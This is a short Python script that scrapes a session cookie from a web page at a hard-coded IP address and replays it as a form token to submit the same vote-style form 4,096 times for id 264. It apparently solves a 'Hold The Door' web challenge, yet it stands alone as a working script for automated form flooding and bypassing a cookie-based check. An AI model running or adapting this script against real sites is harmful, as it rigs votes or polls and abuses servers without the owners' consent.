r = requests.get('http://158.69.76.135/level1.php')
c = r.cookies
for key, value in c.items():
    cookie = value

newcook = {'HoldTheDoor' : cookie}
payload = {'id' : '264', 'holdthedoor' : 'Submit', 'key' : '{}'.format(cookie)}
for i in range(4096):
    r = requests.post('http://158.69.76.135/level1.php', data=payload, cookies=newcook)
    c = r.cookies
    print(i + 1)
    for key, value in c.items():
        cookie = value
    newcook = {'HoldTheDoor' : cookie}
    payload = {'id' : '264', 'holdthedoor' : 'Submit', 'key' : cookie}
